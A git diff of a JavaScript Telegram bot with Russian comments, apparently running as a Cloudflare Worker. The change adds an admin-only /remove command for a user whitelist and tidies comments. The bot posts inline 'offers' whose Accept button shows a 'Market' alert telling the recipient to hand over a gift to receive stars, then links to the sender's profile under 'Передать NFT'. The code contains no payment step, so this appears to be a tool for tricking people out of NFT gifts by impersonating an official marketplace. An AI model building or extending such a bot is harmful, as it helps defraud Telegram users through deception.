@@ -30,7 +30,7 @@ export default {
         await callApi("sendMessage", { chat_id: chatId, text: text, parse_mode: "HTML" });
       }
 
-      // --- /add ---
+      // --- /add (ДОБАВИТЬ) ---
       if (update.message && update.message.text.startsWith("/add ")) {
         const senderId = update.message.from.id;
         if (senderId === ADMIN_ID && kv) {
@@ -47,6 +47,31 @@ export default {
           } else {
             await kv.put(`user:${target}`, "true");
             await callApi("sendMessage", { chat_id: ADMIN_ID, text: `✅ Пользователь с ID <code>${target}</code> добавлен.`, parse_mode: "HTML" });
+          }
+        }
+      }
+
+      // --- /remove (УДАЛИТЬ) ---
+      if (update.message && update.message.text.startsWith("/remove ")) {
+        const senderId = update.message.from.id;
+        if (senderId === ADMIN_ID && kv) {
+          let target = update.message.text.split(" ")[1].trim();
+          
+          if (target.startsWith("@")) {
+            // Удаление по юзернейму
+            const uname = target.slice(1).toLowerCase();
+            const foundId = await kv.get(`username:${uname}`);
+            
+            if (foundId) {
+              await kv.delete(`user:${foundId}`); // Удаляем доступ
+              await callApi("sendMessage", { chat_id: ADMIN_ID, text: `🗑 Пользователь <b>@${uname}</b> удалён из белого списка.`, parse_mode: "HTML" });
+            } else {
+              await callApi("sendMessage", { chat_id: ADMIN_ID, text: `⚠️ Пользователь <b>@${uname}</b> не найден в базе.`, parse_mode: "HTML" });
+            }
+          } else {
+            // Удаление по ID
+            await kv.delete(`user:${target}`);
+            await callApi("sendMessage", { chat_id: ADMIN_ID, text: `🗑 Пользователь с ID <code>${target}</code> удалён из белого списка.`, parse_mode: "HTML" });
           }
         }
       }
@@ -71,7 +96,6 @@ export default {
           if (iq.from.last_name) senderName += " " + iq.from.last_name;
           if (!senderName && iq.from.username) senderName = "@" + iq.from.username;
 
-          // Генерируем короткий ID для офера и сохраняем данные в KV (живет 1 день)
           const offerId = Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
           if (kv) {
             await kv.put(`offer:${offerId}`, JSON.stringify({ giftLink, amount, senderName }), { expirationTtl: 86400 });
@@ -87,7 +111,6 @@ export default {
             input_message_content: { message_text: text, parse_mode: "HTML" },
             reply_markup: {
               inline_keyboard: [
-                // В кнопку кладем ТОЛЬКО короткий ID (безопасно влезает в лимит 64 байта)
                 [{ text: "✅ Принять", callback_data: `acc_${offerId}` }],
                 [{ text: "❌ Отклонить", callback_data: `dec_${offerId}` }]
               ]
@@ -104,26 +127,23 @@ export default {
         const data = cq.data;
         const chatId = cq.message.chat.id;
         const messageId = cq.message.message_id;
-        const hasCaption = !!cq.message.caption; // Проверяем, есть ли подпись под медиа
+        const hasCaption = !!cq.message.caption;
 
-        // ЕСЛИ ПРИНЯТЬ
         if (data.startsWith("acc_")) {
           const offerId = data.replace("acc_", "");
-          let offer = { amount: "⭐", senderName: "покупателя" }; // Значения по умолчанию
+          let offer = { amount: "⭐", senderName: "покупателя" };
           
           if (kv) {
             const saved = await kv.get(`offer:${offerId}`);
             if (saved) offer = JSON.parse(saved);
           }
 
-          // 1. Отвечаем Telegram (убирает белый кружок)
           await callApi("answerCallbackQuery", { 
             callback_query_id: cq.id, 
             text: `Market\nПредложение на продажу успешно принято.\n\nПередайте подарок покупателю, чтобы получить ${offer.amount} ⭐`, 
             show_alert: true 
           });
 
-          // 2. Меняем сообщение (через caption, если есть медиа)
           const newMarkup = { 
             inline_keyboard: [
               [{ text: "Передать NFT ↗", url: `https://t.me/${offer.senderName.replace("@", "")}` }]
@@ -138,13 +158,11 @@ export default {
               await callApi("editMessageText", { chat_id: chatId, message_id: messageId, text: newText, parse_mode: "HTML", reply_markup: newMarkup });
             }
           } catch (e) {
-            console.error("Ошибка при редактировании сообщения:", e.message);
+            console.error("Ошибка при редактировании:", e.message);
           }
         } 
-        
-        // ЕСЛИ ОТКЛОНИТЬ
         else if (data.startsWith("dec_")) {
-          await callApi("answerCallbackQuery", { callback_query_id: cq.id }); // Убираем кружок
+          await callApi("answerCallbackQuery", { callback_query_id: cq.id });
 
           const newText = `× Оффер отклонён.`;
           const emptyMarkup = { inline_keyboard: [] };
@@ -156,7 +174,7 @@ export default {
               await callApi("editMessageText", { chat_id: chatId, message_id: messageId, text: newText, parse_mode: "HTML", reply_markup: emptyMarkup });
             }
           } catch (e) {
-            console.error("Ошибка при редактировании сообщения:", e.message);
+            console.error("Ошибка при редактировании:", e.message);
           }
         }
       }
